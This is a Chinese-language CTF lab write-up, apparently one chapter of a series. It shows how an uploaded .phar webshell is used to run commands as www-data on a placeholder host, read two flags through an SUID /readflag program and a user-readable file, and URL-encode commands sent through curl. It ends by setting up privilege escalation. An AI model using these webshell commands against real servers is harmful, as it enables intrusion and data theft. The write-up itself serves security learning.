# 05 WebShell 执行与前两个 Flag

## 命令执行

上传 `.phar` 文件成功后，我们获得了 `www-data` 权限的 RCE。

直接通过 URL 传参执行命令：

```bash
curl -s "http://x.x.x.x:800/uploads_test/shell.phar?cmd=id"
# 回显：uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 寻找并读取 Flag

执行 `ls -la /` 和 `find / -name "*flag*"` 发现目标系统中有几个可疑文件：`/readflag`、`/flag-user`、`/root/flag`。

### 获取第一个 Flag（SUID 程序）

```bash
curl -s -G "http://x.x.x.x:800/uploads_test/shell.phar" --data-urlencode "cmd=/readflag"
# 回显：flag{****}
```

### 获取第二个 Flag（普通用户可读）

```bash
curl -s -G "http://x.x.x.x:800/uploads_test/shell.phar" --data-urlencode "cmd=cat /flag-user"
# 回显：flag{****}
```

## 踩坑记录 / 技巧总结

**为什么使用 `curl -G --data-urlencode`？**
如果直接使用 `?cmd=cat /flag-user` 传参，命令中的空格、斜杠、特殊字符会被 shell 或 URL 解析错误，导致命令执行失败或回显空白。
使用 `-G` 强制将参数拼接到 URL，并用 `--data-urlencode` 自动进行 URL 编码，可以完美解决传参问题。

## SUID 提权铺垫

**什么是 `/readflag`？**
在 CTF 靶场中，出题人经常会编写一个名为 `/readflag` 的 SUID root 程序。该程序内部逻辑通常是 `system("cat /flag")`。
因为它具有 SUID 权限，普通用户（如 `www-data`）执行它时，会以 `root` 权限运行，从而读取只有 root 才能读的 `/flag` 文件。

**当前权限边界：**
我们已经拿到了前两个 Flag，但 `/root/flag` 需要 root 权限才能读取，因此下一步需要进行提权。
